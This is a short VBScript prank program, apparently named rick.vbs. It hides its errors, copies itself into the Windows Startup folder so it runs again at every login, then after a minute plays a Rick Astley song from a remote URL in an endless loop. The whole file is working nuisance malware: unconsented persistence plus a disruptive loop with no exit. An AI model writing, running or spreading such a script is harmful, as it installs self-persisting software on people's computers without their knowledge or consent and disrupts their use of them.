On Error Resume Next
Err.Clear 

Dim FSO
Set fso = CreateObject("Scripting.FileSystemObject")
GetCurrentFolder = FSO.GetAbsolutePathName(".") + "\rick.vbs"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

startupFolder = shell.SpecialFolders("Startup") & "\"
fso.CopyFile GetCurrentFolder, startupFolder 


Const TemporaryFolder = 2
Dim oFS, sTempPath
Set oFS = CreateObject("Scripting.FileSystemObject")
sTempPath = oFS.GetSpecialFolder(TemporaryFolder)





WScript.Sleep 60000

While true
	Dim oPlayer
	Set oPlayer = CreateObject("WMPlayer.OCX")

	oPlayer.URL = "https://s3-us-west-2.amazonaws.com/true-commitment/01-NeverGonnaGiveYouUp.mp3"
	oPlayer.controls.play 
	While oPlayer.playState <> 1 ' 1 = Stopped
		WScript.Sleep 60000 
	Wend
	
	oPlayer.close
Wend
